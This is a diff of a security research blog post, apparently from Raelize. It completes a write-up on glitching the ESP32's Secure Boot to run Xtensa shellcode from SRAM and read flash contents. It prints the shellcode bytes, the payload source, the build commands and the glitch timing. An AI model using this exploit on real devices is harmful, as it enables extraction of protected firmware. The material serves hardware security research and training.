 <li><code>&quot;\x00\x10\x40\x3f&quot;</code>: addr of bootloader header in flash</li>
 <li><code>&quot;\x25\x78\x0a\x00&quot;</code>: &ldquo;%x\n&rdquo;</li>
 </ul>
-<p>The above data is used by the code payload which is stored at address <code>0x40080000</code> in SRAM and executed once we are successful. This payload only prints 4 bytes from flash, but it can easily be extended to dump the entire flash via the serial interface.</p>
+<p>The above data is used by the shellcode stored at address <code>0x40080000</code> in SRAM. This payload only prints 4 bytes from flash, but it can easily be extended to dump the entire flash via the serial interface (i.e., a nice exercise for our students at our <a href="https://raelize.com/taofi/">TAoFI</a> training).</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>.text
 </span></span><span style="display:flex;"><span>.global _start
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>_start:
-</span></span><span style="display:flex;"><span>    movi    a2, <span style="color:#ae81ff">0x50</span>      
+</span></span><span style="display:flex;"><span>    movi    a2, <span style="color:#ae81ff">0x50</span>
 </span></span><span style="display:flex;"><span>    slli    a2, a2, <span style="color:#ae81ff">24</span>      <span style="color:#75715e">// a2 = 0x50000000
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    l32i.n  a8, a2, <span style="color:#ae81ff">0</span>       <span style="color:#75715e">// a8 = &amp;ets_printf
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    l32i.n  a10, a2, <span style="color:#ae81ff">4</span>      <span style="color:#75715e">// a10 = &amp;&#34;%x\n&#34;
@@ -291,28 +343,28 @@
 </span></span><span style="display:flex;"><span>xtensa-esp32-elf-objdump -d g_shellcode_text.o --adjust-vma<span style="color:#f92672">=</span>0x40080000
 </span></span><span style="display:flex;"><span>xtensa-esp32-elf-objcopy -O binary -j .text g_shellcode_text.o g_shellcode_text
 </span></span><span style="display:flex;"><span>xxd -i g_shellcode_text
-</span></span></code></pre></div><p>We use a bit of additional magic to output c-style code that we can copy pasta directly in the source code of our SRAM payload.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>Disassembly of section .text:
+</span></span></code></pre></div><p>We use a bit of additional magic to output c-style code that we can copy-pasta (!!!) directly in the source code of our SRAM payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>Disassembly of section .text:
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>40080000 &lt;_start&gt;:
-</span></span><span style="display:flex;"><span>40080000:   025c        movi.n  a2, 80
-</span></span><span style="display:flex;"><span>40080002:   012280      slli    a2, a2, 24
-</span></span><span style="display:flex;"><span>40080005:   0288        l32i.n  a8, a2, 0
-</span></span><span style="display:flex;"><span>40080007:   12a8        l32i.n  a10, a2, 4
-</span></span><span style="display:flex;"><span>40080009:   22b8        l32i.n  a11, a2, 8
-</span></span><span style="display:flex;"><span>4008000b:   0bb8        l32i.n  a11, a11, 0
-</span></span><span style="display:flex;"><span>4008000d:   0008e0      callx8  a8
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">40080000</span> <span style="color:#f92672">&lt;</span>_start<span style="color:#f92672">&gt;:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">40080000</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">025</span>c        movi.n  a2, <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">40080002</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">0122</span><span style="color:#ae81ff">80</span>      slli    a2, a2, <span style="color:#ae81ff">24</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">40080005</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">02</span><span style="color:#ae81ff">88</span>        l32i.n  a8, a2, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">40080007</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">12</span>a8        l32i.n  a10, a2, <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">40080009</span><span style="color:#f92672">:</span>   <span style="color:#ae81ff">22</span>b8        l32i.n  a11, a2, <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4008000</span>b:   <span style="color:#ae81ff">0</span>bb8        l32i.n  a11, a11, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4008000</span>d:   <span style="color:#ae81ff">0008e0</span>      callx8  a8
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>40080010 &lt;self&gt;:
-</span></span><span style="display:flex;"><span>40080010:   ffff06      j   40080010 &lt;self&gt;
-</span></span><span style="display:flex;"><span>unsigned char g_shellcode_text[] = {
-</span></span><span style="display:flex;"><span>  0x5c, 0x02, 0x80, 0x22, 0x01, 0x88, 0x02, 0xa8, 0x12, 0xb8, 0x22, 0xb8,
-</span></span><span style="display:flex;"><span>  0x0b, 0xe0, 0x08, 0x00, 0x06, 0xff, 0xff
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">40080010</span> <span style="color:#f92672">&lt;</span>self<span style="color:#f92672">&gt;:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">40080010</span><span style="color:#f92672">:</span>   ffff06      j   <span style="color:#ae81ff">40080010</span> <span style="color:#f92672">&lt;</span>self<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> g_shellcode_text[] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0xa8</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0xb8</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0b</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x06</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>
 </span></span><span style="display:flex;"><span>};
-</span></span><span style="display:flex;"><span>unsigned int shellcode_len = 19;
-</span></span></code></pre></div><p>We can use this output directly in our RAM payload source code.</p>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> shellcode_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">19</span>;
+</span></span></code></pre></div><p>We can use this output directly in our RAM payload source code as is shown in the next section.</p>
 <h4 id="payload-1">Payload</h4>
-<p>We modified the RAM payload a bit in order to copy the shellcode and its data section to the correct location in SRAM.</p>
+<p>We modified the SRAM payload we used during the identification in order to copy the shellcode and its data section to the correct locations in SRAM. Note, also the pointer, denoted by <code>a</code>, now changed from <code>0x41414141</code> to <code>0x40080000</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">/* pointer pointing to a our shellcode in SRAM */</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#define a &#34;.word 0x40080000;&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define t a a a a a a a a a a
@@ -320,7 +372,7 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define d h h h h h h h h h h
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// shellcode data
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">uint32_t</span> g_shellcode_data[] <span style="color:#f92672">=</span>   
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">uint32_t</span> g_shellcode_data[] <span style="color:#f92672">=</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x54\x7d\x00\x40</span><span style="color:#e6db74">&#34;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0c\x00\x00\x50</span><span style="color:#e6db74">&#34;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x10\x40\x3f</span><span style="color:#e6db74">&#34;</span>
@@ -355,26 +407,55 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>We build the above payload in the same manner as before with the tooling provided by Espressif&rsquo;s ESP-IDF.</p>
+</span></span></code></pre></div><p>We build the above payload in the same manner as before with the tooling provided by Espressif&rsquo;s <code>ESP-IDF</code> framework.</p>
 <h4 id="results-1">Results</h4>
-<p>TODO</p>
+<p>We performed <code>~8,500</code> experiments, which took <code>~3h</code>, using similar glitch parameters as during the identification of the vulnerability.</p>
+<ul>
+<li><code>Glitch Length</code> between <code>2,000</code> ns and <code>5,000</code> ns</li>
+<li><code>Glitch Delay</code> between <code>70,000</code> ns and <code>75,000</code> ns</li>
+</ul>
+<p>We use our <a href="https://github.com/raelize/TAoFI-Analyzer">TAoFI-Analyzer</a> to plot all experiments.</p>
+<p style="text-align:center;">
+    <a href="/img/esp32/crowbar/attack_encrypted_codeexec_1.png">
+        <img src="/img/esp32/crowbar/attack_encrypted_codeexec_1.png" style="max-width: 80%; width: 600px">
+    </a>
+    <figcaption>Glitching between 70,000 and 75,000 after the start of the bootloader copy</figcaption>
+</p>
+<p>Similar as before, we see two distinct regions where we observe successful glitches, as is shown below. There are a few outliers, but the two moment in time, one around <code>71,800</code> ns after the trigger and one around <code>74,000</code> ns after the trigger. The plot below, in order to see the regions more clearly, shows only the expected (i.e., green) and successful (i.e., red) experiments.</p>
+<p style="text-align:center;">
+    <a href="/img/esp32/crowbar/attack_encrypted_codeexec_2.png">
+        <img src="/img/esp32/crowbar/attack_encrypted_codeexec_2.png" style="max-width: 80%; width: 600px">
+    </a>
+    <figcaption>Glitching between 70,000 and 75,000 after the start of the bootloader copy (only green and red)</figcaption>
+</p>
+<p>As the results are very similar during the identification of the vulnerability, we are confident that the success rate for executing arbitrary code will be very similar as well. Hence, differently said, we are certain that we are able to execute the payload in order to access the unencrypted flash contents with a high success rate.</p>
 <h2 id="why-does-this-work">Why does this work?</h2>
-<p>We do not know exactly what kind of fault we leverage in order to load one of the pointers into the PC register. We have a few solid ideas, but we like to share these at a later moment in time.</p>
-<p>The techniques we used to come to these ideas are worth a blog post by themselves. Moreover, we like to keep some mystery intact for the students of our <a href="">The Art of Fault Injection</a> training. We are confident that some of them will come up with solid ideas too and maybe even a conclusive answer.</p>
+<hr>
+<p>Interestingly, we do not know exactly what fault we do really introduce in order to make this attack work. We took effort to come up with an explanation, and we have a few solid hypotheses, however, we have not proven them yet.</p>
+<p>This is not the proper context for discussing the techniques we used in order to figure out what fault is at play. Moreover, we like to keep some of the mystery intact for the students of our <a href="https://raelize.com/taofi/">TAoFI</a> training.</p>
+<h2 id="takeaways">Takeaways</h2>
+<hr>
+<p>Before concluding, we want to emphasize several important points that deserve special attention.</p>
+<p><strong>Reproducing FI attacks with different techniques</strong></p>
+<p>This research demonstrates a rare example where an EM glitch attack can be successfully reproduced using voltage glitches. While this bidirectional reproducibility may apply to other targets, it&rsquo;s not universally guaranteed. Notably, our initial <code>ESP32</code> work showed the reverse scenario, when we <a href="/blog/espressif-systems-esp32-bypassing-sb-using-emfi/">bypassed Secure Boot</a>, we reproduced a voltage glitch attack using EM glitches.</p>
+<p>This point actually holds across all our attacks on Espressif&rsquo;s <code>ESP32</code> SoC. This includes attacks that target the CPU (e.g., corrupting an instruction), but pure hardware as well (e.g., <a href="/blog/espressif-systems-esp32-glitching-otp-transfer/">OTP transfer</a>). All of them have been reproduced both with voltage glitching and <code>EM</code> glitches.</p>
+<p><strong>Reproducing FI attacks at scale</strong></p>
+<p>The scale at which we perform these attacks during our <a href="https://raelize.com/taofi/">TAoFI</a> training reveals practical realities that may be often overlooked in research. Simply running our provided scripts doesn&rsquo;t guarantee a successful result. Students require significant effort, and expert guidance, to reproduce the attacks successfully.</p>
+<p>We&rsquo;ve observed students unable to reproduce the attacks, despite following identical procedures. The solution often involves swapping target boards with successful colleagues, revealing that even minor hardware variations, may lead to (very) different results. Nonetheless, due to the complex nature of the attack (i.e., look at the setup pictures), wires are often misplaced as well. Anyhow, the variability has a significant impact and even persists when most variables (e.g., target, tooling, temperature, scripts, timezone, etc.) are the same. This demonstrates the complex interplay of factors that influence glitching success rates in practice.</p>
 <h2 id="conclusion">Conclusion</h2>
-<p>TODO</p>
+<p>We successfully reproduced our <a href="/blog/espressif-esp32-bypassing-encrypted-secure-boot-cve-2020-13629/">EM attack on the Secure Boot</a> implementation of Espressif&rsquo;s ESP32 SoC using Crowbar glitches with NewAE&rsquo;s ChipWhisperer-Husky.</p>
+<p>It took us weeks to identify and exploit the attack with lab-grade tooling. However, once the (hardware) exploit is available, it takes the attendees of our <a href="https://raelize.com/taofi/">TAoFI</a> training only hours to reproduce it, even by using a different FI technique. This shows that, similarly to software exploits, once the vulnerability and the exploit are in the public domain, the time required to reproduce the attack, is lowered significantly.</p>
 <h2 id="final-words">Final words</h2>
-<p>TODO</p>
+<p>Feel free to reach out for questions or remarks related to this research. As always, we are available to give training on the research we perform, during which you will gain hands-on experience exploiting the vulnerabilities described in this blog post.</p>
 <p>- Raelize<span style="color:yellow">.</span></p>
+</div>
+                
 
+                
+                
+            </div>
         </div>
-        
-        
-        
-
-      </div>
     </div>
-  </div>
 </section>
 
 
@@ -431,7 +512,7 @@
 
 <!-- Main Script -->
 
-<script src="http://localhost:1313/js/script.min.117f25fdd69809937e03f47113cbf673f49c2074d65da15ea1d385ad742d92a49ed5dd2000a4585ecfdebda6feb7ef54.js" integrity="sha384-EX8l/daYCZN&#43;A/RxE8v2c/ScIHTWXaFeodOFrXQtkqSe1d0gAKRYXs/evab&#43;t&#43;9U"></script>
+<script src="http://localhost:1313/js/script.min.30c5d71cc6d4427af95614c557ab5b3e327ad2aa865d9c4cb3e3af601bd051948abde36c96cad1b4cb71909318d0e18c.js" integrity="sha384-MMXXHMbUQnr5VhTFV6tbPjJ60qqGXZxMs&#43;OvYBvQUZSKveNslsrRtMtxkJMY0OGM"></script>
 
 
 </body>
